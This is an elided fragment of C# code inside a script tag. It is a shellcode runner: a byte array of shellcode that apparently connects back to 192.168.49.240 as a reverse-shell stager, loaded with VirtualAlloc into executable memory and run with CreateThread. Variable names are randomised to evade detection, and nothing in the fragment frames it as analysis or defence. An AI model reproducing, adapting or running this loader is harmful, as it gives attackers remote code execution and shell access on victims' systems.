...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbd,0xc0,0xa8,0x31,0xf0,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr dhEdjBxYt = VirtualAlloc(IntPtr.Zero,(UIntPtr)cJmezf6.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(cJmezf6,0,dhEdjBxYt,cJmezf6.Length);
        IntPtr lnkqiLI = IntPtr.Zero;
        IntPtr orqSes1Phdg = CreateThread(IntPtr.Zero,UIntPtr.Zero,dhEdjBxYt,IntPtr.Zero,0,ref lnkqiLI);
    }
</script>
